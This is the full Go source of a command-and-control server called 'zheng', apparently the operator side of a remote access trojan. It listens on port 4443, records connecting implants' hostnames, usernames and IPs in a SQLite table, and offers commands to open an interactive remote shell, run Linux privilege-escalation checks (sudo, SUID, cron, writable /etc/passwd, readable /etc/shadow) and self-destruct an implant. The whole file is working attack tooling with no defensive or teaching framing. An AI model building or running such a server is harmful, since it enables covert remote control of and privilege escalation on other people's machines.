package main

import (
	"bufio"
	"database/sql"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

const PORT = "4443"
const DB_PATH = "zheng.db"

const (
	colorReset  = "\033[0m"
	colorGreen  = "\033[32m"
	colorRed    = "\033[31m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorBold   = "\033[1m"
)

type Recon struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Kernel   string `json:"kernel"`
	IP       string `json:"ip"`
	PublicIP string `json:"public_ip"`
}

type Client struct {
	ID      int
	Conn    net.Conn
	Addr    string
	Recon   Recon
	Encoder *json.Encoder
	Decoder *json.Decoder
}

var (
	clients      = make(map[int]*Client)
	nextID       = 1
	notifications int
	db           *sql.DB
)

func initDB() {
	var err error
	db, err = sql.Open("sqlite", DB_PATH)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to open db: %v\n", err)
		os.Exit(1)
	}

	schema := `
	CREATE TABLE IF NOT EXISTS clients (
		id INTEGER PRIMARY KEY,
		ip TEXT,
		public_ip TEXT,
		hostname TEXT,
		username TEXT,
		os TEXT,
		arch TEXT,
		first_seen DATETIME,
		last_seen DATETIME,
		active INTEGER DEFAULT 0
	);`
	if _, err := db.Exec(schema); err != nil {
		fmt.Fprintf(os.Stderr, "failed to create table: %v\n", err)
		os.Exit(1)
	}
}

func dbUpsertClient(id int, recon Recon, addr string, active bool) {
	now := time.Now().Format(time.RFC3339)
	activeInt := 0
	if active {
		activeInt = 1
	}

	_, err := db.Exec(`
		INSERT INTO clients (id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(id) DO UPDATE SET
			ip=excluded.ip, public_ip=excluded.public_ip, hostname=excluded.hostname, username=excluded.username,
			os=excluded.os, arch=excluded.arch, last_seen=excluded.last_seen, active=excluded.active`,
		id, recon.IP, recon.PublicIP, recon.Hostname, recon.Username, recon.OS, recon.Arch, now, now, activeInt)
	if err != nil {
		fmt.Fprintf(os.Stderr, "db upsert error: %v\n", err)
	}
}

func dbMarkInactive(id int) {
	db.Exec("UPDATE clients SET active=0 WHERE id=?", id)
}

func getAllClients() []map[string]interface{} {
	rows, err := db.Query("SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active FROM clients ORDER BY id")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var result []map[string]interface{}
	for rows.Next() {
		var id, active int
		var ip, publicIP, hostname, username, os, arch, firstSeen, lastSeen string
		rows.Scan(&id, &ip, &publicIP, &hostname, &username, &os, &arch, &firstSeen, &lastSeen, &active)
		result = append(result, map[string]interface{}{
			"id": id, "ip": ip, "public_ip": publicIP, "hostname": hostname, "username": username,
			"os": os, "arch": arch, "first_seen": firstSeen, "last_seen": lastSeen, "active": active,
		})
	}
	return result
}

func addClient(conn net.Conn, recon Recon, decoder *json.Decoder, encoder *json.Encoder) *Client {
	c := &Client{
		ID:      nextID,
		Conn:    conn,
		Addr:    conn.RemoteAddr().String(),
		Recon:   recon,
		Encoder: encoder,
		Decoder: decoder,
	}
	clients[nextID] = c
	dbUpsertClient(nextID, recon, c.Addr, true)
	nextID++
	notifications++
	return c
}

func removeClient(id int) {
	if c, ok := clients[id]; ok {
		c.Conn.Close()
		delete(clients, id)
		dbMarkInactive(id)
	}
}

func printLPECheck(name, value string) {
	if value == "" {
		value = "(empty)"
	}
	fmt.Printf("%s[%s]%s\n", colorYellow, name, colorReset)
	fmt.Println(value)
	fmt.Println()
}

func readLPEResults(c *Client) map[string]string {
	results := make(map[string]string)
	for {
		var msg map[string]interface{}
		if err := c.Decoder.Decode(&msg); err != nil {
			fmt.Printf("connection lost: %v\n", err)
			return results
		}

		status, _ := msg["status"].(string)

		switch status {
		case "lpe_check":
			name, _ := msg["name"].(string)
			cmd, _ := msg["cmd"].(string)
			fmt.Printf("%s> [%s]%s %s\n", colorGreen, name, colorReset, cmd)
		case "lpe_skip":
			name, _ := msg["name"].(string)
			fmt.Printf("%s> [%s] SKIP%s\n", colorRed, name, colorReset)
		default:
			for k, v := range msg {
				if str, ok := v.(string); ok {
					results[k] = str
				}
			}
			return results
		}
	}
}

func printPrompt() {
	if notifications > 0 {
		fmt.Printf("%szheng %s[%d]%s> ", colorBold, colorYellow, notifications, colorReset)
	} else {
		fmt.Printf("%szheng%s> ", colorBold, colorReset)
	}
}

func listClients() {
	allClients := getAllClients()
	if len(allClients) == 0 {
		fmt.Println("no clients ever seen")
		return
	}

	fmt.Println()
	fmt.Printf("%-4s %-8s %-21s %-15s %-15s %-15s %-10s %-6s %-10s\n",
		"ID", "STATUS", "ADDR", "PUBLIC IP", "IP", "HOSTNAME", "USER", "OS", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 110))

	for _, row := range allClients {
		id := row["id"].(int)
		active := row["active"].(int)
		ip := row["ip"].(string)
		publicIP := row["public_ip"].(string)
		hostname := row["hostname"].(string)
		username := row["username"].(string)
		osName := row["os"].(string)
		lastSeen := row["last_seen"].(string)

		addr := ""
		if c, ok := clients[id]; ok {
			addr = c.Addr
		}

		status := fmt.Sprintf("%s● active%s", colorGreen, colorReset)
		if active == 0 {
			status = fmt.Sprintf("%s○ stale%s", colorRed, colorReset)
			if addr == "" {
				addr = "-"
			}
		}

		if publicIP == "" {
			publicIP = "-"
		}

		fmt.Printf("%-4d %-18s %-21s %-15s %-15s %-15s %-10s %-6s %-10s\n",
			id, status, addr, publicIP, ip, hostname, username, osName, lastSeen)
	}
	fmt.Println()

	notifications = 0
}

func sendCommand(c *Client, cmd string) error {
	return c.Encoder.Encode(map[string]string{"cmd": cmd})
}

func handleShell(c *Client) {
	fmt.Printf("entering shell on client %d (%s@%s)\n", c.ID, c.Recon.Username, c.Recon.Hostname)
	fmt.Println("type 'exit' to leave shell")

	if err := sendCommand(c, "shell"); err != nil {
		fmt.Printf("failed to send command: %v\n", err)
		return
	}

	// Wait for shell_ready via JSON (last JSON message)
	for {
		var msg struct {
			Status string `json:"status"`
		}
		if err := c.Decoder.Decode(&msg); err != nil {
			fmt.Printf("connection lost: %v\n", err)
			return
		}
		if msg.Status == "shell_ready" {
			break
		}
	}

	// Now switch to raw byte I/O — no more JSON decoder
	done := make(chan struct{})
	go func() {
		defer close(done)
		reader := bufio.NewReader(c.Conn)
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				return
			}
			if strings.Contains(line, "__ZHENG_SHELL_DONE__") {
				fmt.Printf("\nshell exited on client %d\n", c.ID)
				return
			}
			fmt.Print(line)
		}
	}()

	// Read stdin and send raw to conn
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		line := scanner.Text()
		if line == "exit" {
			fmt.Fprintf(c.Conn, "exit\n")
			fmt.Printf("leaving shell on client %d\n", c.ID)
			return
		}
		fmt.Fprintf(c.Conn, "%s\n", line)
	}

	<-done
}

func watchClient(c *Client) {
	// Block until connection drops
	var msg map[string]string
	for {
		if err := c.Decoder.Decode(&msg); err != nil {
			break
		}
	}
	removeClient(c.ID)
	fmt.Printf("\n[!] client %d disconnected (%s@%s)\n", c.ID, c.Recon.Username, c.Recon.Hostname)
	printPrompt()
}

func main() {
	initDB()
	defer db.Close()

	listener, err := net.Listen("tcp", ":"+PORT)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to listen on :%s: %v\n", PORT, err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Fprintf(os.Stderr, "%slistening on :%s%s\n", colorCyan, PORT, colorReset)

	// Accept connections
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go handleConnection(conn)
		}
	}()

	// Command prompt
	scanner := bufio.NewScanner(os.Stdin)
	for {
		printPrompt()
		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		cmd := parts[0]

		switch cmd {
		case "/clients":
			listClients()

		case "/shell":
			if len(parts) < 2 {
				if len(clients) == 1 {
					for _, c := range clients {
						handleShell(c)
					}
				} else if len(clients) == 0 {
					fmt.Println("no active clients")
				} else {
					fmt.Println("usage: /shell <client_id>")
				}
			} else {
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					fmt.Println("invalid client id")
					continue
				}
				if c, ok := clients[id]; ok {
					handleShell(c)
				} else {
					fmt.Printf("client %d not found or inactive\n", id)
				}
			}

		case "/lpe":
			if len(parts) < 2 {
				fmt.Println("usage: /lpe <client_id>")
				continue
			}
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				fmt.Println("invalid client id")
				continue
			}
			c, ok := clients[id]
			if !ok {
				fmt.Printf("client %d not found or inactive\n", id)
				continue
			}
			fmt.Printf("%s[*] requesting LPE checks from client %d (%s@%s)...%s\n",
				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
			if err := sendCommand(c, "lpe"); err != nil {
				fmt.Printf("failed to send command: %v\n", err)
				continue
			}

			// Read lpe_running
			var statusMsg struct {
				Status string `json:"status"`
			}
			c.Decoder.Decode(&statusMsg)

			// Read lpe_checks with check names
			var checksMsg struct {
				Status string   `json:"status"`
				Checks []string `json:"checks"`
			}
			if err := c.Decoder.Decode(&checksMsg); err != nil {
				fmt.Printf("connection lost: %v\n", err)
				continue
			}

			// Display checks and prompt for skip
			fmt.Println()
			fmt.Printf("%savailable checks:%s\n", colorBold, colorReset)
			for i, name := range checksMsg.Checks {
				fmt.Printf("  %d. %s\n", i+1, name)
			}
			fmt.Println()
			fmt.Printf("%senter comma-separated names to skip (or 'none'): %s", colorYellow, colorReset)

			// Read user input for skip list
			scanSkip := bufio.NewScanner(os.Stdin)
			var skipList []string
			if scanSkip.Scan() {
				input := strings.TrimSpace(scanSkip.Text())
				if input != "none" && input != "" {
					for _, s := range strings.Split(input, ",") {
						skipList = append(skipList, strings.TrimSpace(s))
					}
				}
			}

			// Send skip list
			c.Encoder.Encode(map[string]interface{}{"cmd": "lpe_skip", "skip": skipList})

			fmt.Println()
			fmt.Printf("%s[*] running LPE checks (skipping: %v)...%s\n", colorCyan, skipList, colorReset)
			fmt.Println()

			// Read progress and results
			lpeResults := readLPEResults(c)

			fmt.Println()
			fmt.Printf("%s=== LPE RESULTS for %s@%s ===%s\n", colorBold, c.Recon.Username, c.Recon.Hostname, colorReset)
			fmt.Println()
			printLPECheck("OS Info", lpeResults["os_info"])
			printLPECheck("Sudo", lpeResults["sudo"])
			printLPECheck("SUID Binaries", lpeResults["suid"])
			printLPECheck("Cron", lpeResults["cron"])
			printLPECheck("Capabilities", lpeResults["capabilities"])
			printLPECheck("Docker", lpeResults["docker"])
			printLPECheck("Writable PATH dirs", lpeResults["path_writable"])
			printLPECheck("/etc/passwd writable", lpeResults["passwd_writable"])
			printLPECheck("/etc/shadow readable", lpeResults["shadow_readable"])
			printLPECheck("World-writable files", lpeResults["world_writable"])
			printLPECheck("Interesting files", lpeResults["interesting_files"])
			fmt.Println()

		case "/clear":
			fmt.Print("\033[H\033[2J")

		case "/destroy":
			if len(parts) < 2 {
				fmt.Println("usage: /destroy <client_id>")
				continue
			}
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				fmt.Println("invalid client id")
				continue
			}
			c, ok := clients[id]
			if !ok {
				fmt.Printf("client %d not found\n", id)
				continue
			}
			fmt.Printf("%s[!] destroying client %d (%s@%s)...%s\n",
				colorYellow, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
			if err := sendCommand(c, "destroy"); err != nil {
				fmt.Printf("failed to send destroy: %v\n", err)
				continue
			}
			// Wait for response
			var msg struct {
				Status string `json:"status"`
				Error  string `json:"error,omitempty"`
			}
			if err := c.Decoder.Decode(&msg); err != nil {
				fmt.Printf("connection lost: %v\n", err)
			} else if msg.Status == "destroyed" {
				fmt.Printf("%s[+] client %d destroyed%s\n", colorGreen, c.ID, colorReset)
			} else if msg.Status == "destroy_fail" {
				fmt.Printf("%s[-] destroy failed: %s%s\n", colorRed, msg.Error, colorReset)
			}

		case "/done":
			fmt.Println("exiting...")
			for id := range clients {
				removeClient(id)
			}
			os.Exit(0)

		default:
			fmt.Printf("unknown command: %s\n", cmd)
			fmt.Println("commands: /clients, /shell <id>, /lpe <id>, /destroy <id>, /clear, /done")
		}
	}
}

func handleConnection(conn net.Conn) {
	decoder := json.NewDecoder(conn)
	encoder := json.NewEncoder(conn)

	var recon Recon
	if err := decoder.Decode(&recon); err != nil {
		fmt.Fprintf(os.Stderr, "failed to read recon from %s: %v\n", conn.RemoteAddr(), err)
		conn.Close()
		return
	}

	c := addClient(conn, recon, decoder, encoder)
	fmt.Printf("\n%s[+] new client %d: %s@%s (%s) from %s%s\n",
		colorGreen, c.ID, recon.Username, recon.Hostname, recon.IP, c.Addr, colorReset)
	printPrompt()

	watchClient(c)
}
